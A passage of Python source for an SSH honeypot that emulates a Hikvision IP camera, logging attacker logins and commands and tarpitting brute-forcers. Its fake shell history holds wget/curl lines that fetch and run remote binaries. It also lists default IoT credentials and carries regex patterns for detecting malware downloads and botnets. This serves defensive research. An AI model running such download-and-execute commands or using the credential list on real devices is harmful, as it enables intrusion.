"""
ssh_service.py  —  Realistic SSH Honeypot
Uses Paramiko for real SSH crypto so any client connects successfully.
Emulates a Hikvision IP camera running BusyBox / Linux armv7l.

Requirements:  pip install paramiko
"""

import random
import time
import socket
import os
import json
import re
import threading
from collections import defaultdict

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False
    print("[!] paramiko missing — run: pip install paramiko")

# ═══════════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════════

RATE_LIMIT_WINDOW             = 60
MAX_CONNECTIONS_PER_MINUTE    = 15
MAX_FAILED_AUTH_BEFORE_TARPIT = 5
TARPIT_DURATION               = 300
TARPIT_DELAY                  = 1.5

# Persistent RSA host key — generated once, saved next to this file
_KEY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ssh_host_rsa_key")

# ═══════════════════════════════════════════════════════════════════════════
# RATE LIMITING / TARPIT
# ═══════════════════════════════════════════════════════════════════════════

_conn_tracker   = defaultdict(list)
_failed_tracker = defaultdict(int)
_tarpit_until   = {}

def _should_tarpit(ip: str) -> bool:
    now = time.time()
    if ip in _tarpit_until:
        if now < _tarpit_until[ip]:
            return True
        del _tarpit_until[ip]
        _failed_tracker[ip] = 0
    if _failed_tracker[ip] >= MAX_FAILED_AUTH_BEFORE_TARPIT:
        _tarpit_until[ip] = now + TARPIT_DURATION
        return True
    _conn_tracker[ip] = [t for t in _conn_tracker[ip] if now - t < RATE_LIMIT_WINDOW]
    if len(_conn_tracker[ip]) >= MAX_CONNECTIONS_PER_MINUTE:
        _tarpit_until[ip] = now + TARPIT_DURATION
        return True
    _conn_tracker[ip].append(now)
    return False

# ═══════════════════════════════════════════════════════════════════════════
# PERSISTENT RSA HOST KEY
# ═══════════════════════════════════════════════════════════════════════════

_host_key      = None
_host_key_lock = threading.Lock()

def _get_host_key():
    global _host_key
    with _host_key_lock:
        if _host_key is None:
            if os.path.exists(_KEY_FILE):
                _host_key = paramiko.RSAKey.from_private_key_file(_KEY_FILE)
            else:
                _host_key = paramiko.RSAKey.generate(2048)
                _host_key.write_private_key_file(_KEY_FILE)
                os.chmod(_KEY_FILE, 0o600)
    return _host_key

# ═══════════════════════════════════════════════════════════════════════════
# SSH BANNERS
# ═══════════════════════════════════════════════════════════════════════════

_BANNERS = [
    # Old dropbear versions — top targets for Mirai and variants
    "SSH-2.0-dropbear_0.52",
    "SSH-2.0-dropbear_2016.74",
    "SSH-2.0-dropbear_2019.78",
    "SSH-2.0-dropbear_2020.81",
    # Old OpenSSH — embedded/IoT Linux devices (DVR, router, camera)
    "SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2",
    "SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13",
    "SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze5",
    "SSH-1.99-OpenSSH_4.3",              # supports SSH1 — old Cisco/HP/embedded
    "SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u4",
]

# ═══════════════════════════════════════════════════════════════════════════
# CREDENTIALS ACCEPTED BY THE HONEYPOT
# ═══════════════════════════════════════════════════════════════════════════

WEAK_CREDENTIALS = {
    "root":      ["root","toor","admin","password","12345","123456","1234",
                  "rootroot","raspberry","alpine","vizxv","xc3511","juantech",
                  "anko","Zte521","pass","test","qwerty","letmein",""],
    "admin":     ["admin","password","12345","123456","admin123","1234",
                  "administrator","smcadmin","Admin@2024","admin@123",""],
    "pi":        ["raspberry","pi","123456","password",""],
    "user":      ["user","password","12345","1234",""],
    "ubuntu":    ["ubuntu","password","123456",""],
    "support":   ["support","password","12345","support123",""],
    "service":   ["service","12345","password",""],
    "guest":     ["guest","password","12345","guest123",""],
    "operator":  ["operator","1234","password",""],
    "hikvision": ["hikvision","12345","hik12345",""],
    "default":   ["default","12345","password",""],
    "ubnt":      ["ubnt",""],
    "tech":      ["tech","1234"],
}

# ═══════════════════════════════════════════════════════════════════════════
# SHELL PROMPTS
# ═══════════════════════════════════════════════════════════════════════════

_PROMPTS = [
    "root@DVR:~# ",
    "root@IPC:~# ",
    "[root@camera ~]# ",
    "root@(none):/# ",
    "root@HiLinux:~# ",
    "# ",
]

# ═══════════════════════════════════════════════════════════════════════════
# FAKE IoT FILESYSTEM  (honeytoken files included)
# ═══════════════════════════════════════════════════════════════════════════

_FS = {
    "/etc/hostname":  "IPC\n",
    "/etc/issue":     "Hikvision Embedded Linux \\n \\l\n",
    "/etc/motd":      "Welcome to Hikvision IP Camera\nFirmware: V5.7.15 build 230313\n\n",
    "/etc/os-release": (
        'NAME="HiLinux"\nVERSION="1.0"\nID=hilinux\n'
        'PRETTY_NAME="Hikvision HiLinux 1.0"\n'
    ),
    "/etc/passwd": (
        "root:x:0:0:root:/root:/bin/ash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/bin/false\n"
        "bin:x:2:2:bin:/bin:/bin/false\n"
        "sys:x:3:3:sys:/dev:/bin/false\n"
        "admin:x:500:500:System Administrator:/home/admin:/bin/ash\n"
        "nobody:x:65534:65534:nobody:/nonexistent:/bin/false\n"
    ),
    "/etc/shadow": (                    # HONEYTOKEN
        "root:$1$Hik2024.$hashhashhashhash123456:18000:0:99999:7:::\n"
        "admin:$1$xyz789.$hashhashhashhash654321:18000:0:99999:7:::\n"
    ),
    "/etc/group": "root:x:0:\nadmin:x:500:\ndaemon:x:1:\nbin:x:2:\n",
    "/etc/hikvision.conf": (            # HONEYTOKEN
        "DEVICE_MODEL=DS-2CD2043G2-I\n"
        "FIRMWARE=V5.7.15\n"
        "ADMIN_USER=admin\n"
        "ADMIN_PASS=Admin@2024!\n"
        "RTSP_PORT=554\nHTTP_PORT=80\nONVIF_PORT=8000\n"
        "SERIAL=DS-2CD2043G2-I20230313BBRR012345\n"
    ),
    "/.dvr_config": (                   # HONEYTOKEN
        "[System]\nDeviceType=NVR\nModel=DS-2CD2043G2-I\n"
        "SerialNumber=DS-2CD2043G2-I20230313BBRR012345\n"
        "FirmwareVersion=V5.7.15 build 230313\n\n"
        "[Network]\nIP=192.168.1.108\nMAC=44:19:B6:7A:2C:D9\n"
        "Gateway=192.168.1.1\nDNS1=8.8.8.8\n\n"
        "[Admin]\nUsername=admin\nPassword=Admin@2024!\nEnableSSH=true\n"
    ),
    "/root/.env": (                     # HONEYTOKEN
        "ADMIN_PASS=Admin@2024!\nDB_HOST=192.168.1.50\n"
        "DB_PASS=SuperSecret2024!\n"
        "API_KEY=sk-proj-abc123xyz789def456ghi\n"
        "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
        "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
        "SMTP_PASS=MailPass2024!\n"
    ),
    "/root/.ssh/authorized_keys": (
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2... admin@camera\n"
    ),
    "/root/.bash_history": (            # HONEYTOKEN — shows prior attacker cmds
        "ls /\ncat /etc/passwd\ncat /etc/shadow\nifconfig\nps aux\n"
        "wget http://192.168.1.200/update.sh\n"
        "chmod +x update.sh && ./update.sh\n"
        "cd /tmp && ls\n"
        "curl http://45.33.32.156/mips -o /tmp/m && chmod 777 /tmp/m && /tmp/m\n"
        "history -c\n"
    ),
    "/proc/cpuinfo": (
        "processor\t: 0\nmodel name\t: ARMv7 Processor rev 4 (v7l)\n"
        "BogoMIPS\t: 1600.00\n"
        "Features\t: swp half thumb fastmult vfp edsp neon vfpv3\n"
        "CPU implementer\t: 0x41\nCPU architecture: 7\n"
        "CPU variant\t: 0x0\nCPU part\t: 0xc07\nCPU revision\t: 4\n\n"
        "Hardware\t: Hikvision IPCamera\nRevision\t: 0000\n"
        "Serial\t\t: 0000000000000000\n"
    ),
    "/proc/meminfo": (
        "MemTotal:         524288 kB\nMemFree:          128000 kB\n"
        "MemAvailable:     256000 kB\nBuffers:           16384 kB\n"
        "Cached:            98304 kB\nSwapCached:            0 kB\n"
        "Active:           163840 kB\nInactive:          81920 kB\n"
        "SwapTotal:             0 kB\nSwapFree:              0 kB\n"
    ),
    "/proc/version": (
        "Linux version 3.10.14 (builder@hikvision) "
        "(gcc version 4.8.3 20140320 (prerelease)) "
        "#1 SMP PREEMPT Mon Oct 19 08:36:54 UTC 2021\n"
    ),
    "/proc/mounts": (
        "/dev/root / ext4 ro,relatime 0 0\n"
        "proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0\n"
        "sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0\n"
        "tmpfs /tmp tmpfs rw,relatime 0 0\n"
        "/dev/mtdblock5 /mnt/dvr ext4 rw,relatime 0 0\n"
    ),
    "/proc/uptime": "3888000.12 3110400.09\n",
    "/mnt/dvr/recordings/": (
        "total 4194304\n"
        "drwxr-xr-x 2 root root       4096 Mar 19 10:00 .\n"
        "drwxr-xr-x 3 root root       4096 Mar 19 10:00 ..\n"
        "-rw-r--r-- 1 root root 2147483648 Mar 19 10:00 record_20260319_100000.mp4\n"
        "-rw-r--r-- 1 root root 2147483648 Mar 19 09:00 record_20260319_090000.mp4\n"
        "-rw-r--r-- 1 root root 2147483648 Mar 19 08:00 record_20260319_080000.mp4\n"
    ),
    "/tmp/": (
        "total 0\n"
        "drwxrwxrwt 2 root root 4096 Mar 19 10:00 .\n"
        "drwxr-xr-x 3 root root 4096 Mar 19 10:00 ..\n"
    ),
}

# ─── Directory listings ────────────────────────────────────────────────────
_DIRS = {
    "/":          "bin  dev  etc  home  lib  mnt  proc  root  sbin  sys  tmp  usr  var\n",
    "/etc":       "group  hikvision.conf  hostname  hosts  issue  motd  os-release  passwd  shadow\n",
    "/root":      ".bash_history  .env  .ssh\n",
    "/root/.ssh": "authorized_keys  known_hosts\n",
    "/mnt":       "dvr\n",
    "/mnt/dvr":   "config  recordings\n",
    "/tmp":       "\n",
    "/bin":       "ash  busybox  cat  chmod  cp  df  echo  grep  kill  ls  mkdir  mount  mv  ps  rm  sh  uname\n",
    "/usr/bin":   "curl  env  find  id  top  wget  whoami\n",
    "/sbin":      "ifconfig  init  reboot  syslogd\n",
    "/usr/sbin":  "httpd  sshd  telnetd\n",
    "/var/log":   "auth.log  messages  syslog\n",
}

# ─── Static command responses ──────────────────────────────────────────────
_CMD = {
    "id":           "uid=0(root) gid=0(root) groups=0(root)\n",
    "whoami":       "root\n",
    "pwd":          "/root\n",
    "hostname":     "IPC\n",
    "uname":        "Linux\n",
    "uname -a":     "Linux IPC 3.10.14 #1 SMP PREEMPT Mon Oct 19 08:36:54 UTC 2021 armv7l GNU/Linux\n",
    "uname -r":     "3.10.14\n",
    "uname -m":     "armv7l\n",
    "uname -s":     "Linux\n",
    "uname -n":     "IPC\n",
    "busybox":      "BusyBox v1.31.1 (2021-10-19 08:36:54 UTC) multi-call binary.\n",
    "uptime":       " 10:00:00 up 45 days,  3:21,  1 user,  load average: 0.12, 0.08, 0.05\n",
    "date":         time.strftime("%a %b %d %H:%M:%S UTC %Y\n", time.gmtime()),
    "env": (
        "HOME=/root\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
        "SHELL=/bin/ash\nTERM=xterm\nUSER=root\nLOGNAME=root\nPWD=/root\n"
        "DEVICE_MODEL=DS-2CD2043G2-I\nFIRMWARE_VERSION=V5.7.15\n"
    ),
    "printenv": (
        "HOME=/root\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
        "SHELL=/bin/ash\nUSER=root\nPWD=/root\n"
    ),
    "ps": (
        "  PID USER       VSZ STAT COMMAND\n"
        "    1 root      1040 S    init\n"
        "  123 root      2048 S    /sbin/syslogd\n"
        "  234 root      3072 S    /usr/sbin/sshd\n"
        "  345 root      4096 S    /usr/sbin/httpd\n"
        "  456 root      8192 S    /usr/bin/ipc_server\n"
        "  567 root     16384 S    /usr/bin/rtsp_server\n"
        "  678 root      2048 S    /bin/sh\n"
        "  999 root       512 R    ps\n"
    ),
    "ps aux": (
        "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
        "root         1  0.0  0.1   1040   256 ?        S    Oct19   0:00 init\n"
        "root       123  0.0  0.2   2048   512 ?        S    Oct19   0:00 /sbin/syslogd\n"
        "root       234  0.1  0.3   3072   768 ?        S    Oct19   0:12 /usr/sbin/sshd\n"
        "root       345  0.2  0.4   4096  1024 ?        S    Oct19   0:34 /usr/sbin/httpd\n"
        "root       456  1.2  1.6   8192  4096 ?        S    Oct19   5:23 /usr/bin/ipc_server\n"
        "root       567  0.8  3.2  16384  8192 ?        S    Oct19   3:45 /usr/bin/rtsp_server\n"
        "root       999  0.0  0.1    512   128 pts/0    R+   10:00   0:00 ps aux\n"
    ),
    "ps -ef": (
        "UID        PID  PPID  C STIME TTY          TIME CMD\n"
        "root         1     0  0 Oct19 ?        00:00:00 init\n"
        "root       123     1  0 Oct19 ?        00:00:00 /sbin/syslogd\n"
        "root       234     1  0 Oct19 ?        00:00:12 /usr/sbin/sshd\n"
        "root       345     1  0 Oct19 ?        00:00:34 /usr/sbin/httpd\n"
        "root       456     1  1 Oct19 ?        05:23:45 /usr/bin/ipc_server\n"
        "root       567     1  0 Oct19 ?        03:45:12 /usr/bin/rtsp_server\n"
    ),
    "ifconfig": (
        "eth0      Link encap:Ethernet  HWaddr 44:19:B6:7A:2C:D9\n"
        "          inet addr:192.168.1.108  Bcast:192.168.1.255  Mask:255.255.255.0\n"
        "          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n"
        "          RX packets:123456 errors:0 dropped:0 overruns:0 frame:0\n"
        "          TX packets:654321 errors:0 dropped:0 overruns:0 carrier:0\n"
        "          collisions:0 txqueuelen:1000\n"
        "          RX bytes:98765432 (94.1 MiB)  TX bytes:12345678 (11.7 MiB)\n\n"
        "lo        Link encap:Local Loopback\n"
        "          inet addr:127.0.0.1  Mask:255.0.0.0\n"
        "          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n"
    ),
    "ip addr": (
        "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n"
        "    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n"
        "    inet 127.0.0.1/8 scope host lo\n"
        "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000\n"
        "    link/ether 44:19:b6:7a:2c:d9 brd ff:ff:ff:ff:ff:ff\n"
        "    inet 192.168.1.108/24 brd 192.168.1.255 scope global eth0\n"
    ),
    "ip link": (
        "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n"
        "    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n"
        "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n"
        "    link/ether 44:19:b6:7a:2c:d9 brd ff:ff:ff:ff:ff:ff\n"
    ),
    "netstat -an": (
        "Active Internet connections (servers and established)\n"
        "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n"
        "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\n"
        "tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\n"
        "tcp        0      0 0.0.0.0:554             0.0.0.0:*               LISTEN\n"
        "tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN\n"
    ),
    "netstat -tlnp": (
        "Active Internet connections (only servers)\n"
        "Proto Recv-Q Send-Q Local Address   Foreign Address  State    PID/Program\n"
        "tcp        0      0 0.0.0.0:22      0.0.0.0:*        LISTEN   234/sshd\n"
        "tcp        0      0 0.0.0.0:80      0.0.0.0:*        LISTEN   345/httpd\n"
        "tcp        0      0 0.0.0.0:554     0.0.0.0:*        LISTEN   567/rtsp_server\n"
    ),
    "ss -tlnp": (
        "State    Recv-Q Send-Q  Local Address:Port   Peer Address:Port\n"
        "LISTEN   0      128           *:22            *:*      users:((\"sshd\",pid=234))\n"
        "LISTEN   0      128           *:80            *:*      users:((\"httpd\",pid=345))\n"
        "LISTEN   0      128           *:554           *:*      users:((\"rtsp\",pid=567))\n"
    ),
    "free":   (
        "             total       used       free     shared    buffers     cached\n"
        "Mem:        524288     396288     128000          0      16384      98304\n"
        "-/+ buffers/cache:     281600     242688\n"
        "Swap:            0          0          0\n"
    ),
    "free -m": (
        "             total       used       free     shared    buffers     cached\n"
        "Mem:           512        387        124          0         16         96\n"
        "-/+ buffers/cache:        274        237\n"
        "Swap:            0          0          0\n"
    ),
    "df":   (
        "Filesystem           1K-blocks      Used Available Use% Mounted on\n"
        "/dev/root               524288    393216    131072  75% /\n"
        "tmpfs                   262144      1024    261120   1% /tmp\n"
        "/dev/mtdblock5         2097152   1048576   1048576  50% /mnt/dvr\n"
    ),
    "df -h": (
        "Filesystem                Size      Used Available Use% Mounted on\n"
        "/dev/root               512.0M    384.0M    128.0M  75% /\n"
        "tmpfs                   256.0M      1.0M    255.0M   1% /tmp\n"
        "/dev/mtdblock5            2.0G      1.0G      1.0G  50% /mnt/dvr\n"
    ),
    "mount": (
        "/dev/root on / type ext4 (ro,relatime)\n"
        "proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)\n"
        "sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)\n"
        "tmpfs on /tmp type tmpfs (rw,relatime)\n"
        "/dev/mtdblock5 on /mnt/dvr type ext4 (rw,relatime)\n"
    ),
    "dmesg": (
        "[    0.000000] Linux version 3.10.14 (builder@hikvision)\n"
        "[    0.000000] CPU: ARMv7 Processor [410fc075] revision 5 (ARMv7)\n"
        "[    1.234567] Hikvision IPCamera platform initialized\n"
        "[    2.345678] eth0: link up, 100Mbps, full-duplex\n"
        "[    3.456789] RTSP server starting on port 554\n"
        "[    4.567890] HTTP server starting on port 80\n"
        "[    5.678901] Camera module initialized: DS-2CD2043G2-I\n"
        "[    6.789012] Recording service started\n"
        "[    7.890123] ONVIF service ready on port 8000\n"
    ),
    "dmesg | tail": (
        "[    5.678901] Camera module initialized: DS-2CD2043G2-I\n"
        "[    6.789012] Recording service started\n"
        "[    7.890123] ONVIF service ready on port 8000\n"
    ),
    "top": (
        "Mem: 396288K used, 128000K free, 16384K shrd, 98304K buff, 81920K cached\n"
        "CPU:  1% usr  0% sys  0% nic 98% idle  0% io  0% irq  0% sirq\n"
        "Load average: 0.12 0.08 0.05\n\n"
        "  PID  PPID USER     STAT   VSZ %VSZ CPU %CPU COMMAND\n"
        "  456     1 root     S     8192   1%   0  1.2 ipc_server\n"
        "  567     1 root     S    16384   3%   0  0.8 rtsp_server\n"
        "  234     1 root     S     3072   0%   0  0.1 sshd\n"
    ),
    "w": (
        " 10:00:00 up 45 days,  3:21,  1 user,  load average: 0.12, 0.08, 0.05\n"
        "USER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT\n"
        "root     pts/0    192.168.1.1      10:00    0.00s 0.01s  0.00s -ash\n"
    ),
    "last": (
        "root     pts/0        192.168.1.1      Mon Mar 18 09:12   still logged in\n"
        "root     pts/0        10.0.0.5         Sun Mar 17 14:33 - 14:45  (00:12)\n"
        "reboot   system boot  3.10.14          Mon Feb  5 12:00\n"
    ),
    "lastlog": (
        "Username         Port     From             Latest\n"
        "root             pts/0    192.168.1.1      Mon Mar 18 09:12:34 +0000 2026\n"
        "admin            pts/0    10.0.0.5         Sun Mar 17 14:33:11 +0000 2026\n"
    ),
    "history": (
        "    1  ls /\n    2  cat /etc/passwd\n    3  ifconfig\n"
        "    4  ps aux\n    5  wget http://192.168.1.200/update.sh\n"
        "    6  chmod +x update.sh\n    7  ./update.sh\n"
    ),
    "cat /etc/motd":     "Welcome to Hikvision IP Camera\nFirmware: V5.7.15 build 230313\n",
    "cat /etc/issue":    "Hikvision Embedded Linux\n",
    "cat /etc/hostname": "IPC\n",
    "iptables -L":       "Chain INPUT (policy ACCEPT)\nChain FORWARD (policy ACCEPT)\nChain OUTPUT (policy ACCEPT)\n",
    "iptables -nL":      "Chain INPUT (policy ACCEPT)\nChain FORWARD (policy ACCEPT)\nChain OUTPUT (policy ACCEPT)\n",
    "crontab -l":        "no crontab for root\n",
    "lsmod": (
        "Module                  Size  Used by\n"
        "hi3516cv500_isp       524288  0\n"
        "hi_mipi               131072  0\n"
        "hi3516cv500_base       65536  2\n"
    ),
    "find / -name '*.conf' 2>/dev/null": (
        "/etc/hikvision.conf\n/etc/resolv.conf\n/etc/network.conf\n"
    ),
    "find /etc -type f": (
        "/etc/passwd\n/etc/shadow\n/etc/group\n/etc/hostname\n"
        "/etc/issue\n/etc/motd\n/etc/hikvision.conf\n/etc/os-release\n"
    ),
    "cat /proc/version": (
        "Linux version 3.10.14 (builder@hikvision) "
        "(gcc version 4.8.3 20140320 (prerelease)) "
        "#1 SMP PREEMPT Mon Oct 19 08:36:54 UTC 2021\n"
    ),
    "cat /proc/uptime": "3888000.12 3110400.09\n",
}

# ═══════════════════════════════════════════════════════════════════════════
# COMMAND EXECUTION ENGINE
# ═══════════════════════════════════════════════════════════════════════════

def _execute(cmd: str) -> str:
    cmd = cmd.strip()
    if not cmd:
        return ""

    # Chained commands (&&, ||, ;)
    for sep in (" && ", " ; ", "; "):
        if sep in cmd:
            return "".join(_execute(p.strip()) for p in cmd.split(sep))

    # Pipes — run only the first segment (we fake output anyway)
    if " | " in cmd and cmd not in _CMD:
        return _execute(cmd.split(" | ")[0].strip())

    # Exact match
    if cmd in _CMD:
        return _CMD[cmd]

    parts = cmd.split()
    verb  = parts[0]
    args  = parts[1:]
    rest  = " ".join(args)

    # ── cat ───────────────────────────────────────────────────────────────
    if verb == "cat":
        target = rest.strip()
        if target in _FS:
            return _FS[target]
        for path, content in _FS.items():
            if path.rstrip("/") == target.rstrip("/"):
                return content
        return f"cat: {target}: No such file or directory\n"

    # ── ls ────────────────────────────────────────────────────────────────
    if verb in ("ls", "ll", "dir"):
        flags   = [a for a in args if a.startswith("-")]
        targets = [a for a in args if not a.startswith("-")]
        target  = (targets[-1].rstrip("/") if targets else "/root")

        for dirpath, listing in _DIRS.items():
            dp = dirpath.rstrip("/") or "/"
            if dp == (target or "/"):
                if any("l" in f for f in flags) or verb == "ll":
                    lines = [f"total {random.randint(4, 64)}"]
                    for name in listing.strip().split():
                        lines.append(
                            f"-rwxr-xr-x 1 root root {random.randint(512,65536):8d}"
                            f" Mar 19 10:00 {name}"
                        )
                    return "\n".join(lines) + "\n"
                return listing

        if "recordings" in target:
            return _FS.get("/mnt/dvr/recordings/", "")
        if target in ("/tmp", "tmp"):
            return _FS.get("/tmp/", "")
        return _CMD.get("ls", "")

    # ── echo ──────────────────────────────────────────────────────────────
    if verb == "echo":
        text = rest.replace('"', "").replace("'", "")
        if " > " in text:
            text = text.split(" > ")[0].strip()
        return text + "\n"

    # ── wget / curl / tftp ────────────────────────────────────────────────
    if verb in ("wget", "curl", "tftp", "axel"):
        return ""

    # ── silent commands ───────────────────────────────────────────────────
    if verb in ("chmod","chown","chgrp","mkdir","rm","mv","cp","touch",
                "kill","killall","export","unset","sync","cd","ln",
                "crontab","sed","awk","tr","xargs"):
        return ""

    # ── which ─────────────────────────────────────────────────────────────
    if verb == "which":
        bins = {
            "ls":"/bin/ls","cat":"/bin/cat","ps":"/bin/ps",
            "wget":"/usr/bin/wget","curl":"/usr/bin/curl",
            "sh":"/bin/sh","bash":"/bin/bash","id":"/usr/bin/id",
            "whoami":"/usr/bin/whoami","find":"/usr/bin/find",
        }
        t = args[0] if args else ""
        return bins.get(t, f"{t} not found\n")

    # ── find ──────────────────────────────────────────────────────────────
    if verb == "find":
        full = " ".join(parts)
        return _CMD.get(full, "")

    # ── grep ──────────────────────────────────────────────────────────────
    if verb == "grep":
        return ""

    # ── shells ────────────────────────────────────────────────────────────
    if verb in ("sh","bash","ash","/bin/sh","/bin/bash","/bin/ash","/bin/busybox"):
        return ""

    # ── python ────────────────────────────────────────────────────────────
    if verb in ("python","python3","perl","php"):
        return ""

    # ── reboot / poweroff ─────────────────────────────────────────────────
    if verb in ("reboot","poweroff","halt","shutdown"):
        return "The system is going down for reboot NOW!\n"

    return f"-ash: {verb}: not found\n"

# ═══════════════════════════════════════════════════════════════════════════
# DETECTION HELPERS
# ═══════════════════════════════════════════════════════════════════════════

def _detect_malware_url(cmd: str):
    patterns = [
        r"(https?://\S+\.(?:sh|elf|bin|arm|mips|x86|arm7|arm5|m68k|ppc|mpsl|mipsel))\b",
        r"(?:wget|curl|tftp\s+-g)\s+(https?://\S+)",
        r"(https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[:\d]*/\S+)",
    ]
    for pat in patterns:
        m = re.search(pat, cmd, re.I)
        if m:
            return m.group(1)
    return None

def _detect_arch(cmd: str) -> str:
    for a in ["arm7","arm6","arm5","arm","mips","mipsel","mpsl",
              "x86","i686","ppc","m68k","sh4","sparc"]:
        if a in cmd.lower():
            return a
    return "unknown"

def _detect_botnet(cmd: str) -> str:
    families = {
        "Mirai":   ["busybox","ecchi","/bin/busybox","cat /proc/cpuinfo"],
        "Gafgyt":  ["httpflood","udpflood","tftp -g","junk"],
        "Mozi":    ["mozi","nttpd","dht"],
        "Muhstik": ["muhstik","join #","irc"],
        "Sora":    ["sora","/bin/busybox sora"],
    }
    s = cmd.lower()
    for fam, indicators in families.items():
        if any(ind in s for ind in indicators):
            return fam
    return "Unknown"

_SCANNERS = {
    "masscan":["masscan"],"nmap":["nmap"],"zgrab":["zgrab"],
    "shodan":["shodan"],"hydra":["hydra"],"medusa":["medusa"],
    "metasploit":["metasploit"],"paramiko":["paramiko"],
    "putty":["putty"],"libssh":["libssh"],"ncrack":["ncrack"],
}

def _detect_scanner(text: str) -> str:
    t = text.lower()
    for tool, sigs in _SCANNERS.items():
        if any(s in t for s in sigs):
            return tool
    return ""

# ═══════════════════════════════════════════════════════════════════════════
# SESSION REPLAY DATABASE
# ═══════════════════════════════════════════════════════════════════════════

_replay_db: list = []
_MAX_REPLAYS = 50

def _save_replay(session: dict):
    if len(session.get("commands", [])) >= 3:
        _replay_db.append({
            "username": session.get("username"),
            "password": session.get("password"),
            "commands": list(session.get("commands", [])),
        })
        if len(_replay_db) > _MAX_REPLAYS:
            _replay_db.pop(0)

# ═══════════════════════════════════════════════════════════════════════════
# PARAMIKO SERVER INTERFACE
# ═══════════════════════════════════════════════════════════════════════════

class _HoneypotServer(paramiko.ServerInterface):

    def __init__(self, ip: str, log_attack, session: dict, track_cred_attempt=None):
        self.ip                  = ip
        self.log_attack          = log_attack
        self.session             = session
        self.shell_ev            = threading.Event()
        self.exec_cmd            = None
        self.track_cred_attempt  = track_cred_attempt

    def check_channel_request(self, kind, chanid):
        return (paramiko.OPEN_SUCCEEDED if kind == "session"
                else paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED)

    def check_auth_password(self, username: str, password: str):
        self.session["username"]       = username
        self.session["password"]       = password
        self.session["auth_attempts"] += 1

        is_valid = (username in WEAK_CREDENTIALS and
                    password in WEAK_CREDENTIALS.get(username, []))

        if self.log_attack:
            self.log_attack(self.ip, 22, "SSH_AUTH_ATTEMPT", json.dumps({
                "username":   username,
                "password":   password,
                "attempt":    self.session["auth_attempts"],
                "valid_cred": is_valid,
            }))

        if self.track_cred_attempt:
            self.track_cred_attempt(self.ip, "ssh")

        # Realistic delay — slows brute-force
        time.sleep(random.uniform(0.6, 1.8))

        accept = False
        if is_valid:
            if self.session["auth_attempts"] >= 2 or random.random() < 0.10:
                accept = True

        if accept:
            self.session["authenticated"] = True
            if self.log_attack:
                self.log_attack(self.ip, 22, "SSH_AUTH_SUCCESS", json.dumps({
                    "username": username,
                    "password": password,
                    "attempts": self.session["auth_attempts"],
                }))
            return paramiko.AUTH_SUCCESSFUL

        _failed_tracker[self.ip] += 1
        return paramiko.AUTH_FAILED

    def check_auth_publickey(self, username: str, key):
        if self.log_attack:
            self.log_attack(self.ip, 22, "SSH_PUBKEY_ATTEMPT", json.dumps({
                "username": username,
                "key_type": key.get_name(),
                "key_fp":   key.get_fingerprint().hex(),
            }))
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username: str) -> str:
        return "password,publickey"

    def check_channel_pty_request(self, channel, term, width, height,
                                   pixelwidth, pixelheight, modes):
        return True

    def check_channel_shell_request(self, channel):
        self.shell_ev.set()
        return True

    def check_channel_exec_request(self, channel, command: bytes):
        self.exec_cmd = command.decode(errors="ignore")
        self.shell_ev.set()
        return True

    def check_channel_subsystem_request(self, channel, name: str):
        return False

    def check_channel_window_change_request(self, channel, width, height,
                                             pixelwidth, pixelheight):
        return True

# ═══════════════════════════════════════════════════════════════════════════
# INTERACTIVE SHELL
# ═══════════════════════════════════════════════════════════════════════════

def _run_shell(channel, session: dict, ip: str, log_attack, is_tarpitted: bool,
               log_malware=None, log_honeytoken=None):
    prompt = random.choice(_PROMPTS)
    buf    = ""

    channel.send(
        b"\r\nWelcome to Hikvision IP Camera\r\n"
        b"Firmware: V5.7.15 build 230313\r\n"
        b"Model: DS-2CD2043G2-I\r\n\r\n"
    )
    time.sleep(0.05)
    channel.send(prompt.encode())
    channel.settimeout(180)

    try:
        while True:
            try:
                data = channel.recv(512)
            except socket.timeout:
                break
            if not data:
                break

            for ch in data.decode(errors="ignore"):
                if ch in ("\r", "\n"):
                    channel.send(b"\r\n")
                    cmd = buf.strip()
                    buf = ""

                    if not cmd:
                        channel.send(prompt.encode())
                        continue

                    if cmd.lower() in ("exit", "quit", "logout", "bye"):
                        channel.send(b"logout\r\n")
                        return

                    session["commands"].append(cmd)

                    if log_attack:
                        log_attack(ip, 22, "SSH_COMMAND", json.dumps({
                            "command":  cmd,
